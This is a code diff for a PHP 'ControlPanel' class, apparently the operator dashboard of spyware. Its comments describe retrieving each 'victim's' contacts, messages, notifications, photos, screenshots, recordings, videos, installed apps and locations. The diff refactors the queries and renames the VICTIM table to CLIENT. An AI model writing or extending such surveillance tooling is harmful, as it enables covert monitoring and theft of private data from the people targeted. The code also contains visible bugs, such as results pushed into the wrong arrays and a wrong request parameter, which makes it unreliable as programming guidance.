@@ -34,10 +34,8 @@ class ControlPanel extends Base
      */
     public function home(): void
     {
-        // $clients = $this->getClients();
-
-        // render('home.php', ['clients' => $clients]);
-        render('home.php', []);
+        $clients = $this->getClients();
+        render('home.php', ['clients' => $clients]);
     }
 
     /**
@@ -48,19 +46,7 @@ class ControlPanel extends Base
         if (!$this->isClientIdSet())
             header("/");
 
-        $query = "SELECT * FROM CONTACT WHERE client_id=?";
-        $rows = $this->database->select($query, [$_GET['client']]);
-
-        $contacts = [];
-        foreach ($rows as $row) {
-            $screenshots[] = new Contact(
-                $row['id'],
-                $row['client_id'],
-                $row['name'],
-                $row['number']
-            );
-        }
-
+        $contacts = $this->getContacts($_GET['client']);
         render('features/contacts.php', ['contacts' => $contacts]);
     }
 
@@ -79,19 +65,7 @@ class ControlPanel extends Base
             
         }
 
-        $query = "SELECT * FROM IMAGE WHERE client_id=?";
-        $rows = $this->database->select($query, [$_GET['client']]);
-
-        $images = [];
-        foreach ($rows as $row) {
-            $screenshots[] = new Image(
-                $row['id'],
-                $row['client_id'],
-                $row['filename'],
-                $row['timestamp']
-            );
-        }
-
+        $images = $this->getImages($_GET['client']);
         render('features/images.php', ['images' => $images]);
     }
 
@@ -103,19 +77,7 @@ class ControlPanel extends Base
         if (!$this->isClientIdSet())
             header("/");
 
-        $query = "SELECT * FROM INSTALLED_APPS WHERE client_id=?";
-        $rows = $this->database->select($query, [$_GET['client']]);
-
-        $installedApps = [];
-        foreach ($rows as $row) {
-            $installedApps[] = new InstalledApp(
-                $row['id'],
-                $row['client_id'],
-                $row['package_name'],
-                $row['app_name']
-            );
-        }
-
+        $installedApps = $this->getInstalledApps($_GET['client']);
         render('features/apps.php', ['installedApps' => $installedApps]);
     }
 
@@ -127,18 +89,7 @@ class ControlPanel extends Base
         if (!$this->isClientIdSet())
             header("/");
 
-        $query = "SELECT * FROM LOCATION WHERE client_id=?";
-        $rows = $this->database->select($query, [$_GET['client']]);
-
-        $knownLocations = [];
-        foreach ($rows as $row) {
-            $knownLocations[] = new Location(
-                $row['id'],
-                $row['client_id'],
-                $row['timestamp']
-            );
-        }
-
+        $knownLocations = $this->getKnownLocations($_GET['client']);
         render('features/location.php', ['knownLocations' => $knownLocations]);
     }
 
@@ -150,20 +101,7 @@ class ControlPanel extends Base
         if (!$this->isClientIdSet())
             header("/");
 
-        $query = "SELECT * FROM MESSAGE WHERE client_id=?";
-        $rows = $this->database->select($query, [$_GET['client']]);
-
-        $messages = [];
-        foreach ($rows as $row) {
-            $messages[] = new Message(
-                $row['id'],
-                $row['client_id'],
-                $row['sender'],
-                $row['content'],
-                $row['timestamp']
-            );
-        }
-
+        $messages = $this->getMessages($_GET['client']);
         render('features/messages.php', ['messages' => $messages]);
     }
 
@@ -175,20 +113,7 @@ class ControlPanel extends Base
         if (!$this->isClientIdSet())
             header("/");
 
-        $query = "SELECT * FROM NOTIFICATION WHERE client_id=?";
-        $rows = $this->database->select($query, [$_GET['client']]);
-
-        $notifications = [];
-        foreach ($rows as $row) {
-            $notifications[] = new Notification(
-                $row['id'],
-                $row['client_id'],
-                $row['sender'],
-                $row['content'],
-                $row['timestamp']
-            );
-        }
-
+        $notifications = $this->getNotifications($_GET['client']);
         render('features/notifications.php', ['notifications' => $notifications]);
     }
 
@@ -204,19 +129,7 @@ class ControlPanel extends Base
         
         }
 
-        $query = "SELECT * FROM RECORDING WHERE client_id=?";
-        $rows = $this->database->select($query, [$_GET['client']]);
-
-        $recordings = [];
-        foreach ($rows as $row) {
-            $screenshots[] = new Recording(
-                $row['id'],
-                $row['client_id'],
-                $row['filename'],
-                $row['timestamp']
-            );
-        }
-
+        $recordings = $this->getRecordings($_GET['client']);
         render('features/recordings.php', ['recordings' => $recordings]);
     }
 
@@ -232,26 +145,14 @@ class ControlPanel extends Base
 
         }
 
-        $query = "SELECT * FROM SCREENSHOT WHERE client_id=?";
-        $rows = $this->database->select($query, [$_GET['client']]);
-
-        $screenshots = [];
-        foreach ($rows as $row) {
-            $screenshots[] = new Screenshot(
-                $row['id'],
-                $row['client_id'],
-                $row['filename'],
-                $row['timestamp']
-            );
-        }
-
+        $screenshots = $this->getScreenshots($_GET['screenshots']);
         render('features/screeshots.php', ['screenshots' => $screenshots]);
     }
 
     /**
      * Get victim's video(s)
      */
-    public function vidoes(): void
+    public function videos(): void
     {
         if (!$this->isClientIdSet())
             header("/");
@@ -260,19 +161,7 @@ class ControlPanel extends Base
         
         }
 
-        $query = "SELECT * FROM VIDEO WHERE client_id=?";
-        $rows = $this->database->select($query, [$_GET['client']]);
-
-        $videos = [];
-        foreach ($rows as $row) {
-            $videos[] = new Video(
-                $row['id'],
-                $row['client_id'],
-                $row['filename'],
-                $row['timestamp']
-            );
-        }
-
+        $videos = $this->getVideos($_GET['client']);
         render('features/videos.php', ['videos' => $videos]);
     }
 
@@ -284,7 +173,7 @@ class ControlPanel extends Base
     private function getClients(): array
     {
         $clients = [];
-        $query = "SELECT * FROM VICTIM";
+        $query = "SELECT * FROM CLIENT";
         $rows = $this->database->select($query, []);
 
         foreach ($rows as $row) {
@@ -298,6 +187,7 @@ class ControlPanel extends Base
 
      /**
      * Get victim's contacts
+     * @param int $victimID
      * 
      * @return array<Contact>
      */
@@ -321,6 +211,7 @@ class ControlPanel extends Base
 
      /**
      * Get victim's images
+     * @param int $victimID
      * 
      * @return array<Image>
      */
@@ -343,14 +234,39 @@ class ControlPanel extends Base
     }
 
      /**
+     * Get victim's installed applications
+     * @param int $victimID
+     * 
+     * @return array<InstalledApp>
+     */
+    private function getInstalledApps(int $victimID): array
+    {
+        $installedApps = [];
+        $query = "SELECT * FROM INSTALLED_APP WHERE client_id=?";
+        $rows = $this->database->select($query, [$victimID]);
+
+        foreach ($rows as $row) {
+            $installedApps = new InstalledApp(
+                $row['id'],
+                $row['client_id'],
+                $row['package_name'],
+                $row['app_name']
+            );
+        }
+
+        return $installedApps;
+    }
+
+     /**
      * Get victim's known locations
+     * @param int $victimID
      * 
      * @return array<Location>
      */
     private function getKnownLocations(int $victimID): array
     {
         $knownLocations = [];
-        $query = "SELECT * FROM VIDEO WHERE client_id=?";
+        $query = "SELECT * FROM LOCATION WHERE client_id=?";
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
@@ -366,6 +282,7 @@ class ControlPanel extends Base
 
      /**
      * Get victim's messages
+     * @param int $victimID
      * 
      * @return array<Message>
      */
@@ -390,6 +307,7 @@ class ControlPanel extends Base
 
      /**
      * Get victim's notifications
+     * @param int $victimID
      * 
      * @return array<Notification>
      */
@@ -414,6 +332,7 @@ class ControlPanel extends Base
 
      /**
      * Get victim's recordings
+     * @param int $victimID
      * 
      * @return array<Recording>
      */
@@ -437,6 +356,7 @@ class ControlPanel extends Base
 
      /**
      * Get victim's screenshots
+     * @param int $victimID
      * 
      * @return array<Screenshot>
      */
@@ -460,6 +380,7 @@ class ControlPanel extends Base
 
      /**
      * Get victim's videos
+     * @param int $victimID
      * 
      * @return array<Video>
      */
